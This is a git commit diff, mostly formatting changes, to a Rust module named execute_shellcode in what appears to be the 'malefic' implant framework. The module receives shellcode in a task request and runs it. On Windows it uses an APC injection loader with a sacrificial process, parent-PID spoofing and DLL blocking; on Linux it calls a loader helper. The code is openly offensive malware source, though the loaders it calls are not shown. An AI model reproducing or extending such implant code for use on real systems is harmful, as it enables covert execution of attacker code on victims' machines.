4556c3784e60c10ab74b0691fa741027c868205f
M09Ic <m09ician@gmail.com>
2024-08-19 20:39:52 +0800

    Update execute_shellcode.rs

--- malefic-modules/src/sys/execute_shellcode.rs
+++ malefic-modules/src/sys/execute_shellcode.rs
@@ -1,7 +1,7 @@
-use malefic_helper::protobuf::implantpb::AssemblyResponse;
 use crate::{check_request, to_error, Module, Result, TaskResult};
-use malefic_helper::protobuf::implantpb::spite::Body;
 use async_trait::async_trait;
+use malefic_helper::protobuf::implantpb::spite::Body;
+use malefic_helper::protobuf::implantpb::AssemblyResponse;
 use malefic_trait::module_impl;
 
 pub struct ExecuteShellcode {}
@@ -10,7 +10,12 @@ pub struct ExecuteShellcode {}
 #[module_impl("execute_shellcode")]
 impl Module for ExecuteShellcode {
     #[allow(unused_variables)]
-    async fn run(&mut self, id: u32, receiver: &mut crate::Input, sender: &mut crate::Output) -> Result {
+    async fn run(
+        &mut self,
+        id: u32,
+        receiver: &mut crate::Input,
+        sender: &mut crate::Output,
+    ) -> Result {
         let request = check_request!(receiver, Body::ExecuteBinary)?;
         let bin = request.bin;
         let sacrifice = request.sacrifice;
@@ -18,7 +23,7 @@ impl Module for ExecuteShellcode {
         let mut is_need_sacrifice = false;
         let mut ppid = 0;
         let mut is_block_dll = false;
-        let mut ret: Vec::<u8> = Vec::new();
+        let mut ret: Vec<u8> = Vec::new();
 
         let mut response = AssemblyResponse::default();
         unsafe {
@@ -35,28 +40,25 @@ impl Module for ExecuteShellcode {
             }
             #[cfg(target_os = "windows")]
             {
-                ret = to_error!(
-                    malefic_helper::win::loader::apc::loader(
-                        bin, 
-                        is_need_sacrifice, 
-                        par.as_ptr() as _,
-                        ppid, 
-                        is_block_dll)
-                )?;
+                ret = to_error!(malefic_helper::win::loader::apc::loader(
+                    bin,
+                    is_need_sacrifice,
+                    par.as_ptr() as _,
+                    ppid,
+                    is_block_dll
+                ))?;
             }
             #[cfg(target_os = "linux")]
             {
-                ret = to_error!(
-                    malefic_helper::linux::loader::memfd::loader(
-                        bin,
-                        need_output
-                    )
-                )?;
+                ret = to_error!(malefic_helper::linux::loader::loader(bin, request.output))?;
             }
         }
 
         response.status = 0;
         response.data = ret;
-        Ok(TaskResult::new_with_body(id, Body::AssemblyResponse(response)))
+        Ok(TaskResult::new_with_body(
+            id,
+            Body::AssemblyResponse(response),
+        ))
     }
 }
